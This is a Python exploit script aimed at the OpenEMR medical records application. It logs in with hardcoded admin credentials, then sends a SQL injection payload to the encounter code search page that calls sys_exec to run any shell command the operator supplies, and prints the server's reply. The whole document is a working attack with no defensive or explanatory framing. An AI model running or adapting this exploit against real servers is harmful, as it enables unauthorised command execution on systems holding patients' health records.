import requests
import time
import sys

if len(sys.argv) != 4:
    print('%s <ip> <port> <cmd>')
    sys.exit(-1)

host = sys.argv[1]
port = sys.argv[2]
cmd  = sys.argv[3]

# Login
s = requests.Session()
username = "admin"
password = "pass"
url = "http://%s:%s/openemr/interface/main/main_screen.php?auth=login&site=default" % (host, port)
data= {
    'new_login_session_management' : '1',
    'authProvider' : 'Default',
    'authUser' : username ,
    'clearPass' : password ,
    'languageChoice' : '1',
    }

req = s.post(url, data=data)

# GO
url = "http://%s:%s/openemr/interface/patient_file/encounter/search_code.php?type=" % (host, port)
data = {
    'mode': 'search',
    'text': "1') OR (SELECT sys_exec('%s'))-- " % cmd
}
req = s.post(url, data=data)
print(req.text)
